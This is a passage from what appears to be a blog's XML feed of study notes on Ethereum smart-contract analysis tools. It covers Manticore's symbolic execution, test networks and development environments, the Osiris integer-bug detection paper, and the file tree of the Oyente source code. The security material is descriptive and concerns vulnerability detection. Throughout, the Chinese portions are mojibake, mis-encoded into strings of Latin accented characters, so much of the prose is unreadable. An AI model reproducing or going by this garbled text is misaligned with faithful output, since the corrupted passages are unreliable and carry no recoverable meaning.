Manticoreï¼ˆå…·ä½“çš„è®ºæ–‡æ²¡è¯´ï¼‰</p><h4 id="ethereum-symbolic-execution">Ethereum Symbolic Execution</h4><p>Smart contracts receive input as network transactions consisting of a<strong>value and a data buffer.</strong> The transaction data buffercontains information about which function should be executed in acontract, and its arguments.</p><p>Symbolic execution of smart contracts involves <strong>symbolictransactions, where both value and data are symbolic</strong>. Symbolictransactions are applied to all Ready states,</p><p>Symbolic transactions can be repeatedly executed to genericallyexplore the state space of a contract.</p><p>Manticoreâ€™s emulated environment for smart contract executionsupports an arbitrary number of interacting contracts. It is capable oftracking not only a single contractâ€™s state, but a full Ethereumâ€worldâ€</p><h3 id="auxiliary-modules">Auxiliary Modules</h3><p>SMT-LIB module that supplies a custom symbolic expression objectmodel and an SMT solver interface</p><p>The Event System decouples Manticore as a whole from externalinstrumentation-based analyses</p><p>Manticore can broadcast various symbolic execution events (e.g.memory reads/writes, state forking, concretization) that can be handledby an event subscriber outside of Manticore, such as an API client.</p><p>è¿˜æœ‰æ’ä»¶ç³»ç»Ÿ</p><h2 id="ethereum-smart-contract-analysis-evaluation">ETHEREUM SMARTCONTRACT ANALYSIS EVALUATION</h2><p>Manticoreâ€™s Python API allows advanced users to customize theiranalysis using various forms of instrumentation. Hooking via the APIlets users execute callbacks when a certain state is reached.</p><p>states can be pruned, custom constraints can be applied, andsatisfiability queries can be sent to the solver</p><h3 id="ethereum-smart-contract-analysis-evaluation-1">ETHEREUM SMARTCONTRACT ANALYSIS EVALUATION</h3><p>evaluated Manticore based on a corpus of 100 Ethereum smart contractstaken directly from the Ethereum blockchain1.</p><p>æŒ‡æ ‡: tracks <strong>the number of states</strong> discovered and<strong>coverage of the contract code.</strong></p><p>with a timeout of 90 minutes per contract Manticore produced anaverage coverage of 65.64%,</p><p>These assumptions were, however, sufficient for Manticore to achievegreater than 90% code coverage on 25 of the contracts.</p><h2 id="smart-contract-security-assessments">Smart Contract SecurityAssessments</h2><p>Trail of Bits å…¬å¸å·²ç»ç”¨äº†å¾ˆå¤šï¼Œè¯¦ç»†è§ä¸€äº›æŠ¥å‘Šã€‚</p><p>æŠ¥å‘Šåœ°å€è§è®ºæ–‡æœ«å°¾ 12-16 æµ‹è¯•æŠ¥å‘Šæœ‰æ¼æ´ç±»åˆ«ä»¥åŠä¸€äº›è¯¦ç»†ä»‹ç»ç­‰</p><h2 id="ä¼˜ç¼ºç‚¹">ä¼˜ç¼ºç‚¹</h2><h3 id="ä¼˜ç‚¹">ä¼˜ç‚¹</h3><ol type="1"><li>çµæ´»ï¼Œç”¨æˆ·å‹å¥½ï¼ˆæä¾› apiï¼‰ ä¸€ä¸ªä¸å¹³å°æ— å…³çš„é€šç”¨ç¬¦å·æ‰§è¡Œå¼•æ“</li><li>å¯æ‰©å±•ï¼Œæœ‰ Ethereum æµ‹è¯•æ¨¡å—</li></ol><h3 id="ç¼ºç‚¹">ç¼ºç‚¹</h3><ol type="1"><li>ç›¸å¯¹ angr æ¥è¯´ï¼Œä¸æ”¯æŒæŸäº› IEEE754 æµ®ç‚¹æ•°æŒ‡ä»¤ï¼ˆIEEE 754 floatingpoint instructionsï¼‰ï¼Œå› æ­¤åœ¨ logic bomb benchmark ä¸­æ•ˆæœä¸å¤ªå¥½</li></ol><blockquote><p>Since angr supports the use of some IEEE 754 floating pointinstructions thatManticore does not, we expect that Manticore mayovertake angr in the future, once it adds such support.</p></blockquote><h2 id="ä¸€äº›ä»‹ç»">ä¸€äº›ä»‹ç»</h2><p><ahref="http://pwn4.fun/2017/06/01/Manticore%EF%BC%9A%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/#more">Manticoreï¼šç¬¦å·æ‰§è¡Œ</a></p><p><ahref="https://www.sweety.cn/23190/manticore%E7%AE%80%E4%BB%8B%EF%BC%8C%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E7%AC%A6%E5%8F%B7%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7.html">MANTICOREç®€ä»‹ï¼Œæ™ºèƒ½åˆçº¦çš„ç¬¦å·åˆ†æå·¥å…·</a></p><h2 id="ç°å­˜ä¸»æµå·¥å…·">ç°å­˜ä¸»æµå·¥å…·</h2><ol type="1"><li><ahref="https://github.com/trailofbits/manticore">manticore</a></li><li><a href="https://github.com/eth-sri/securify2">Securifyv2.0</a></li><li><a href="https://github.com/melonproject/oyente">Oyente</a></li><li><a href="www.lianantech.com">Beosin-VaaS</a></li><li>Mythril</li><li>EthIR</li><li>Zeus</li><li>Slither</li><li>Osiris åªæ£€æµ‹ integer bugs</li></ol>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åŒºå—é“¾ç½‘ç»œåŠå…¶å¼€å‘ç¯å¢ƒ</title>
      <link href="/blog/2021/04/13/blockchain/network_develop/"/>
      <url>/blog/2021/04/13/blockchain/network_develop/</url>
      
        <content type="html"><![CDATA[<p>All Ethereum node communicate with each other through<strong>Ethereum Protocol</strong>. same way storing or accessingdata.</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16176125451508.jpg"alt="16176125451508" /><figcaption aria-hidden="true">16176125451508</figcaption></figure><p>Private Network: Ethereum can <ahref="https://geth.ethereum.org/docs/interface/private-network">set up aPrivate Network</a>ï¼Œåœ¨ç§æœ‰ç½‘ç»œä¸­ï¼Œå¯ä»¥ä½¿ç”¨ PoW æˆ–è€… PoAç®—æ³•ã€‚ä¹Ÿå°±æ˜¯å¯ä»¥æ­å»ºç§æœ‰çš„ä»¥å¤ªåŠè”ç›Ÿé“¾ã€‚</p><p>å‚è€ƒï¼š<ahref="https://github.com/xianfeng92/Love-Ethereum/blob/master/notes/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E9%83%A8%E7%BD%B2%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%81%94%E7%9B%9F%E9%93%BE.md">è‡ªå·±åŠ¨æ‰‹éƒ¨ç½²ä»¥å¤ªåŠè”ç›Ÿé“¾.md</a></p><h1 id="main-networktestnet-network-and-developer-network">MainNetworkã€Testnet Network and Developer Network</h1><ol type="1"><li>Main Network Persistent;Real-Blockchain;Costs Money</li><li>Testnet Network Persistent, but can be deleted; Real-Blockchain;BetaRelease. Test Smart Contracts, Protocol Updates<ol type="1"><li>Ropsten</li><li>Rinkeby</li><li>Gorli</li></ol></li><li>Developer Network Unit Testing;Fast;Non-Persistent Ganache</li></ol><p>If you are testing on Ganacheï¼Œ at least before you goingproductionï¼ŒIt's also very important you should test on the realnetwork.</p><h2 id="å…¨èŠ‚ç‚¹å’Œè½»èŠ‚ç‚¹">å…¨èŠ‚ç‚¹å’Œè½»èŠ‚ç‚¹</h2><p>é¦–å…ˆè¦ä»ã€Œåˆ›å§‹å—ã€â€”â€”<ahref="https://www.zhihu.com/search?q=ä¸­æœ¬èª&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A342784693%7D">ä¸­æœ¬èª</a>çš„è®ºæ–‡è¯´èµ·ï¼Œä»–åœ¨æ–‡ä¸­æåˆ° SPVï¼ˆSimplified Payment Verificationï¼‰ï¼ŒSPVå€ŸåŠ© Merkle Proofæœºåˆ¶ï¼Œåªéœ€è¦ä¿å­˜æœ€é•¿åŒºå—é“¾çš„æ‰€æœ‰å—å¤´çš„æƒ…å†µä¸‹ï¼Œå°±èƒ½å¤ŸéªŒè¯å¯¹ä¸€ç¬”æ”¯ä»˜äº¤æ˜“æ˜¯å¦åœ¨å­˜åœ¨ã€‚ç›¸æ¯”è¾ƒäºå…¨èŠ‚ç‚¹ï¼Œå®ç°SPV çš„å®¢æˆ·ç«¯ç§°ä¸ºè½»èŠ‚ç‚¹ï¼ˆLight Nodeï¼‰ã€‚</p><h2 id="metamask-infrua">MetaMask &amp; Infrua</h2><p>deploy metamaskï¼Œget ether from Test Networkï¼ˆusually Ropsten, GoerliTest Networkï¼‰ Steps: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16170917687007.jpg"alt="metamask" /></p><p>MetaMask, faucet.metamask.io, EtherScanç­‰æ˜¯å¦‚ä½•ä¸åŒºå—é“¾è¿›è¡Œäº¤äº’çš„ã€‚</p><ul><li><p>MetaMask é€šè¿‡ä¸ Infura æœåŠ¡è¿æ¥ï¼Œè¯¥æœåŠ¡é€šè¿‡è¿è¡Œ go-ethereumï¼Œparity ç»´æŠ¤æœ¬åœ°åŒºå—é“¾èŠ‚ç‚¹ï¼Œç„¶åä¸åŒºå—é“¾è¿›è¡Œäº¤äº’ã€‚</p></li><li><p>æµè§ˆå™¨è®¿é—®çš„ç½‘ç«™åç«¯ï¼Œå­˜å‚¨ç€å‘é€è€…çš„ç§é’¥ä¸æœ¬åœ°åŒºå—é“¾èŠ‚ç‚¹ï¼Œä»è€Œä¸åŒºå—é“¾è¿›è¡Œäº¤äº’ã€‚</p></li><li><p>xx.etherscan.io çš„åç«¯æœåŠ¡å™¨ï¼Œéƒ¨ç½²å­˜å‚¨ xxç½‘ç»œçš„åŒºå—é“¾èŠ‚ç‚¹ï¼Œä»è€Œå¯ä»¥æŸ¥çœ‹è¯¥åŒºå—é“¾ç½‘ç»œçš„äº¤æ˜“å˜åŠ¨ã€‚ <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16170945031666.jpg"alt="etherscan" /></p></li><li><p>You need a blockchain node to interact with theBlockchainï¼Œeither your own nodeï¼Œor hosted node.</p></li><li><p>The Blockchain is the single source of truth.</p></li><li><p>There are infrastructure providers to abstract runningBlockchains away from developers, users to make the onboarding quiteeasy.</p></li></ul><h2 id="development-environment">Development Environment</h2><p>åœ¨ Remix çš„ â€œDEPLOY &amp; RUN TRANSACTIONSâ€ï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸‰ç§ENVIRONMENTï¼Œåˆ†åˆ«ä¸ºï¼šJavaScript VMã€Injected Web3ã€Web3 Providerã€‚</p><p>ä¸‰è€…çš„åŒºåˆ«ï¼š</p><ol type="1"><li><p><ahref="https://remix-ide.readthedocs.io/en/latest/run.html#environment">Deploy&amp; Run</a></p></li><li><p><ahref="https://ethereum.stackexchange.com/questions/40227/difference-between-javascript-vm-vs-injected-w3-vs-web3-provider">Differencebetween Javascript VM vs injected w3 vs web3 provider</a></p></li><li><p><ahref="https://stackoverflow.com/questions/48368149/remix-ethereum-where-goes-the-contract">RemixEthereum where goes the contract?</a></p></li></ol><p>Web3 ä¸­æŒ‡å®šæµ‹è¯•ç½‘ç»œçš„ chainidï¼šç”¨æ¥é˜²æ­¢é‡æ”¾æ”»å‡»ï¼Œåœ¨ EIP-155ä¸­æå‡ºçš„ã€‚æ¯”å¦‚ chainid=1 æ˜¯ä¸»ç½‘ï¼Œå› ä¸ºæ˜¯æœ¬åœ°æµ‹è¯•ç½‘ç»œï¼Œæ‰€ä»¥éšä¾¿å–äº†ä¸€ä¸ª116ã€‚</p><p><ahref="https://willzhuang.github.io/2019/03/22/%E8%AF%A6%E8%BF%B0ethereum%E4%B8%ADChainID%E5%92%8CNetworkID/">è¯¦è¿°ethereum ä¸­ ChainID å’Œ NetworkID</a></p><p>Mining on real Blockchains, even test-networks, can take a while.It's not very convenient for Development.</p><h2 id="ganache">Ganache</h2><p>Ganache is a Blockchain and a Wallet. Two in one. Anyone can connectto it using a Web3 Provider Method either via http RPC orWebSockets.</p><p>é‡‡ç”¨ MetaMask è‡ªå®šä¹‰ RPCï¼Œæ·»åŠ  Ganache çš„è™šæ‹Ÿé’±åŒ…åœ°å€ï¼ŒRemix-ide é€‰æ‹©Injected-Web3 æˆ– Web3-Provider.</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Osiris è®ºæ–‡é˜…è¯»ç¬”è®°</title>
      <link href="/blog/2021/04/10/blockchain/eth_vulns/paper_osiris/"/>
      <url>/blog/2021/04/10/blockchain/eth_vulns/paper_osiris/</url>
      
        <content type="html"><![CDATA[<h2 id="background-and-contribution">Background and Contribution</h2><h3 id="background">Background</h3><ol type="1"><li>æ™ºèƒ½åˆçº¦ç››è¡Œï¼Œç„¶è€Œå…¶æ¼æ´å¾ˆå¤šï¼Œè´¢äº§æŸå¤±ä¸¥é‡</li><li>The prevalence of integer bugs in smart contracts. <ahref="https://dasp.co/#item-3">2018 å¹´ä½å±… top3</a></li></ol><h3 id="contribution">Contribution</h3><p>Osiris</p><ol type="1"><li>a symbolic execution tool / a framework combines symbolic executionand taint analysis</li><li>auto-matically detects integer bugs in EVM bytecode</li><li>The tool currently covers <strong>three different types of integerbugs</strong>: arithmetic bugs, truncation bugs and signednessbugs.</li></ol><p>Advantages:</p><ol type="1"><li><p>Compared with Zeus, Osiris detects <strong>morevulnerabilities</strong>, with <strong>more confidence</strong>, as thefalse positives rate is considerably lower with our tool.</p></li><li><p>Osiris detects a <strong>greater range of bugs</strong> thanexisting toolsï¼Œeven discovered <strong>unknownvulnerabilities</strong>.</p></li><li><p>è®ºæ–‡è¿˜å¯¹ EVM å’Œ solidity ç¼–è¯‘å™¨æå‡ºä¿®æ”¹å»ºè®®ï¼Œæ¥é¿å… integerbugs.</p></li></ol><h2 id="integer-bugs-introduction">integer bugs introduction</h2><ol type="1"><li>arithmetic bugs<ol type="1"><li>integer overflows</li><li>underflows</li><li>division by zero</li><li>modulo zero,</li></ol></li><li>truncation bugs å¤§èŒƒå›´ int -&gt; å°èŒƒå›´ int çš„è½¬æ¢ Converting avalue of one integral type to a narrower integral type which has ashorter range of values may introduce so-called truncation bugs.</li><li>signedness bugs æœ‰ç¬¦å· &lt;-&gt; æ— ç¬¦å· å¯èƒ½ä¼šå¯¼è‡´ è´Ÿå€¼ &lt;-&gt;å¤§çš„æ­£å€¼.</li></ol><p>how to detect integer bugs contained in these contracts</p><p>è§è®ºæ–‡ p3ï¼š2.3 Integer Bugs in Ethereum Smart Contracts</p><h2 id="methodology">Methodology</h2><p>æ–¹æ³•è®ºï¼Œå¦‚ä½•æ£€æµ‹ integer bugs</p><p>Detect integer bugs at the bytecode level</p><ol type="1"><li>inferring integer types</li><li>detecting integer bugs</li><li>applying taint analysis to reduce false positives.</li></ol><p>other challenges such as identifying intended checks for integerbugs.</p><ol type="1"><li><p>Type Inference</p><p>Type information is usually only available at the source code leveland not at the bytecode level.</p><p>Due to certain code optimisations introduced by the Solidity compilerduring compile time, it is actually <strong>possible</strong> to inferthe size and the sign of integers at the bytecode level.</p><p>ç„¶åè®²äº†æ ¹æ®é‚£äº›ç‰¹å®šçš„ä»£ç ç­‰æ¥æ¨æµ‹ size å’Œ sign</p></li><li><p>Finding Integer Bugs åˆ†åˆ«ä»ä¸‰ç§ç±»å‹æ¥è®²è¿°å¦‚ä½•å¯»æ‰¾ã€‚ è§è®ºæ–‡ p4 3.2Finding Integer Bugs</p></li><li><p>Taint Analysis é™ä½å‡é˜³ç‡ Taint analysis can help to distinguishbetween benign(è‰¯æ€§çš„) overflows introduced by the developer orcompiler, and malicious overflows that are exploitable by anattacker.</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200507180404.png"alt="taint analysis" /><figcaption aria-hidden="true">taint analysis</figcaption></figure><p>Therefore, by deliberately ignoring integer bugs that do notoriginate from a source and do not flow into a sink, we can focusexclusively on actual exploitable integer bugs and gracefully reduce thenumber of false positives</p><p>ç„¶åè®²äº†å¸¸è§å¯ä»¥ä½œä¸º sources æˆ– sinkså¯¹åº”çš„æŒ‡ä»¤ä»¬ï¼Œå¹¶æ”¶é›†é€‚å½“é€‰å–ä»–ä»¬ï¼Œä»¥ä¾¿åé¢åˆ¤æ–­ä½¿ç”¨</p></li><li><p>Identifying Benign Integer Bugså°½ç®¡æ±¡ç‚¹åˆ†æå·²ç»å‡ä½äº†ä¸€äº›å‡é˜³ç‡ã€‚ there are still some cases where aninteger bug might originate from an untrusted source and "ow into asensitive sink, while being a benign integer bug.</p><p>In order to cope with such cases, we came up with some heuristicrules. å¹¶è®²è¿°äº†å¯å‘å¼è§„åˆ™ã€‚</p></li></ol><h2 id="osiris">OSIRIS</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/2020561588765275347.png"alt="Architecture of ORISIS" /><figcaption aria-hidden="true">Architecture of ORISIS</figcaption></figure><p>We implemented Osiris on top of Oyenteâ€™s symbolic executionengine.</p><h3 id="design-overview">Design Overview</h3><p><strong>Input</strong>: the bytecode or Solidity source code of asmart contract. <strong>The latter gets internally compiled to EVMbytecode</strong> <strong>Output</strong>: whether a contract containsany integer bug (e.g. overflow, underflow, truncation, etc.)</p><p><strong>Three main components</strong>: symbolic analysis, taintanalysis and integer error detection</p><ol type="1"><li><p>Symbolic Analysis The symbolic analysis component<strong>constructs</strong> a Control Flow Graph (CFG) and symbolically<strong>executes</strong> the different paths of the contract. Thesymbolic analysis component passes the result of every executedinstruction to the taint analysis component as well as to the integererror detection component.</p><ol type="1"><li>The symbolic analysis component starts by constructing a CFG fromthe bytecode. Osiris can output a visual representation of the CFGdepicting the individual path conditions and highlighting the basicblocks that include integer bugs.</li><li>After constructing the CFG, the symbolic execution engine starts byexecuting the entry node of the CFG.</li></ol></li><li><p>Taint Analysis The taint analysis component <strong>introduces,propagates and checks</strong> for taint <strong>across stack, memoryand storage.</strong></p><ol type="1"><li><p>The symbolic execution engine forwards every executed instructionto the taint analysis component.</p></li><li><p>The taint analysis component checks wether the executedinstruction is part of the list of defined sources</p><ol type="1"><li><p>If that is the case, the taint analysis component introducestaint by tagging the affected stack, memory or storage location</p></li><li><p>Identifies the <strong>operands</strong> of each EVM bytecodeinstruction and propagates the taint according to the semantics of eachinstruction as defined in [38]</p></li><li><p>The following principle: if an instruction uses a tainted valueto derive another value, then the derived value becomes tainted as wellé€šè¿‡éµå¾ªæ­¤æ±¡ç‚¹ä¼ æ’­åŸåˆ™ï¼Œè¯¥å·¥å…·å®ç°äº†æ¯” Mythrill æ›´ç²¾ç¡®çš„ä¼ æ’­ Mythrilpropagates taint across the stack, but for certain instructions it doesnot propagate taint across memory or storage.</p></li><li><p>The taint analysis component verifies if a taint flow occurred,by</p><ol type="1"><li>checking whether the executed instruction is part of the list ofdefined sinks</li><li>if any of the values it used has been tainted by an integerbug.</li></ol></li></ol></li></ol></li><li><p>Integer Error Detection The integer error detection componentchecks whether an integer bug is possible within the executedinstruction.</p><p>The integer error detection component is only called at instructionsthat may result in integer bugs, such as arithmetic instructions. Callsto the integer error detection component are only performed if at leastone of the operands of the executed instruction is tainted. If thesecriteria are met, then the symbolic execution engine eventually forwards<strong>the executed instruction along with the current pathconditions</strong> to the integer error detection component.</p><p>the component follows the different techniques as described inSection 3.2 in order to detect the specific integer bugs.</p><p>è§è®ºæ–‡ p7 Integer Error Detection çš„ For Example</p><ol type="1"><li>å¯¹äºå¯èƒ½å­˜åœ¨æŸç§ integer bugs çš„æŒ‡ä»¤ï¼ŒSymbolic Analysis componentè°ƒç”¨ Integer Error Detection ä¸­å¯¹åº”çš„æ–¹æ³•è¿›è¡Œæ£€æµ‹</li><li>creates a formula with a constraint that is only feasible if aninteger overflow is possible <strong>under the current pathconditions</strong>.</li><li>pass the formula to the Z3 solver which checks for itsfeasibility</li><li>If the solver finds a solution to the formula, then <strong>theinteger error detection component</strong> knows that an integeroverflow is possible and returns an error back to <strong>the symbolicanalysis component</strong></li><li>The symbolic analysis component calls the taint analysis component,which then taints the result of the AND instruction where its sourcerepresents the discovered integer bug.</li></ol></li></ol><h2 id="evaluation">EVALUATION</h2><ol type="1"><li>Via the qualitative analysis we aim to determine the reliability ofour tool by comparing our results with Zeus</li><li>Via the quantitative analysis we intend to demonstrate thescalability of Osiris</li></ol><h3 id="qalitative-analysis">Qalitative Analysis</h3><p>é‡ç”¨äº† Zeus çš„æ•°æ®é›†ï¼Œå¹¶ä¸ Zeus å¯¹æ¯”ã€‚ ç»“è®ºï¼š 1. Zeus ç¼ºç‚¹ 1. Zeuså¹¶ä¸æ˜¯åƒå®ƒè®ºæ–‡ä¸Šå£°ç§°çš„é‚£æ · 0 å‡é˜´ç‡(æœ‰ bug çš„æŠ¥å‘Šä¸º æ—  bug çš„) 2. Zeuså¹¶ä¸èƒ½æ£€æµ‹é‚£äº›è‰¯æ€§çš„ integer bugs (were induced by the developer or bythe Solidity compiler as part of handling data structures of dynamicsize such as arrays, strings or bytes.)ï¼Œå³: é”™è¯¯åœ°å°†å…¶è¯†åˆ«ä¸º bugs 3.Zeus does not check for division by zero or modulo zero bugs 2. ä¹Ÿæœ‰ä¸€äº›Zeus æ£€æµ‹å‡ºæ¥ï¼Œè€Œ Osiris æ²¡æœ‰æ£€æµ‹å‡ºæ¥ï¼Œä½†æ˜¯é‚£åªæ˜¯å› ä¸º Osiris çš„ sourcesæ£€æµ‹åˆ—è¡¨é‡Œé¢æ²¡æœ‰ï¼ŒåŠ ä¸Šå°±è¡Œäº†ã€‚ 3. åœ¨æœ¬æ¬¡æµ‹è¯•ä¸­ï¼ŒOrisi çš„ false negativerate æ¯” ZEUS ä½ 88%ï¼ˆ28/32ï¼‰</p><h3 id="qantitative-analysis">Qantitative Analysis</h3><p>ä»å…¬å¼€çš„ä»¥å¤ªåŠåŒºå—é“¾ä¸Šæ”¶é›†äº† 1,207,335, å…¶ä¸­ only 50,535 are uniquein terms of their bytecode.</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200507183547.png"alt="20200507183547" /><figcaption aria-hidden="true">20200507183547</figcaption></figure><h2 id="detection-of-real-world-vulnerabilities">Detection of Real-WorldVulnerabilities</h2><h3 id="detecting-known-vulnerabilities">Detecting KnownVulnerabilities</h3><p>CVE ä»¬ï¼Œéƒ½æˆåŠŸæ£€æµ‹å‡ºæ¥äº†</p><h3 id="detecting-unknown-vulnerabilities">Detecting UnknownVulnerabilities</h3><p>DataSet: Etherscan provides a list of top tokens ranked by theirmarket capitalisation We downloaded the bytecode as well as the sourcecode for these 495 smart contracts and analysed them using Osiris.</p><p>We found two overflows to be false positives</p><h2 id="ä¸è¶³ä¸æ”¹è¿›">ä¸è¶³ä¸æ”¹è¿›</h2><p>è§è®ºæ–‡ p12</p><ol type="1"><li><p>plan to extend Osirisâ€™s taint analysis to also track taint acrossmultiple contracts (inter-contract analysis) and <strong>acrossdifferent method invocations</strong> (trace analysis).</p></li><li><p>aim to switch to <strong>concolic execution</strong> usingconcrete values from the blockchain in order to validate and generatedirect exploits. This may help us make Osirisâ€™s detection mechanism<strong>even more precise</strong>.</p></li><li><p>want to <strong>augment our evaluation on the security ofEthereum tokens</strong>.</p></li></ol><p><ahref="https://link.springer.com/chapter/10.1007/978-3-540-78800-3_24">Z3:An Efficient SMT Solver</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Oyente æºç é˜…è¯»ç¬”è®°</title>
      <link href="/blog/2021/04/05/blockchain/eth_vulns/oyente_intro/"/>
      <url>/blog/2021/04/05/blockchain/eth_vulns/oyente_intro/</url>
      
        <content type="html"><![CDATA[<h1 id="oyente-æºç é˜…è¯»ç¬”è®°">Oyente æºç é˜…è¯»ç¬”è®°</h1><h2 id="å¤§è‡´æ–‡ä»¶ç»“æ„">å¤§è‡´æ–‡ä»¶ç»“æ„</h2><p>é¦–å…ˆï¼Œé€šè¿‡ <code>tree -L 2</code> æŸ¥çœ‹å¤§è‡´ 2 å±‚æ–‡ä»¶ç»“æ„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ code.md</span><br><span class="line">â”œâ”€â”€ CONTRIBUTING.md</span><br><span class="line">â”œâ”€â”€ Dockerfile</span><br><span class="line">â”œâ”€â”€ LICENSE</span><br><span class="line">â”œâ”€â”€ misc_utils</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ generate-graphs.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ get_source.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ stats-collect.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ transaction_scrape 2.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ transaction_scrape.py</span><br><span class="line">â”‚Â Â  â””â”€â”€ tx-stats.py</span><br><span class="line">â”œâ”€â”€ oyente</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ analysis.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ast_helper.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ast_walker.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ basicblock.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ batch_run.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ethereum_data1.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ethereum_data.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ global_params.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ input_helper.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ opcodes.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ oyente.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ run_tests.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ source_map.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ state.json</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ symExec.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ test_evm</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ utils.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ vargenerator.py</span><br><span class="line">â”‚Â Â  â””â”€â”€ vulnerability.py</span><br><span class="line">â”œâ”€â”€ pylintrc</span><br><span class="line">â”œâ”€â”€ README.md</span><br><span class="line">â”œâ”€â”€ setup.py</span><br><span class="line">â”œâ”€â”€ sol_examples</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ BECToken.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ calls.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ etherstore.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ exceptions.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ hashforether.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ origin.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ returnvalue.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ rubixi.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ suicide.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ timelock.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ token.sol</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ WalletLibrary.sol</span><br><span class="line">â”‚Â Â  â””â”€â”€ weak_random.sol</span><br><span class="line">â””â”€â”€ web</span><br><span class="line">    â”œâ”€â”€ app</span><br><span class="line">    â”œâ”€â”€ bin</span><br><span class="line">    â”œâ”€â”€ browser-solidity</span><br><span class="line">    â”œâ”€â”€ config</span><br><span class="line">    â”œâ”€â”€ config.ru</span><br><span class="line">    â”œâ”€â”€ db</span><br><span class="line">    â”œâ”€â”€ Gemfile</span><br><span class="line">    â”œâ”€â”€ Gemfile.lock</span><br><span class="line">    â”œâ”€â”€ lib</span><br><span class="line">    â”œâ”€â”€ log</span><br><span class="line">    â”œâ”€â”€ package.json</span><br><span class="line">    â”œâ”€â”€ public</span><br><span class="line">    â”œâ”€â”€ Rakefile</span><br><span class="line">    â”œâ”€â”€ README.md</span><br><span class="line">    â”œâ”€â”€ test</span><br><span class="line">    â”œâ”€â”€ vendor</span><br><span class="line">    â””â”€â”€ yarn.lock</span><br><span class="line"></span><br><span class="line">15 directories, 52 files</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="level-one">Level One</h3><p>å‡ 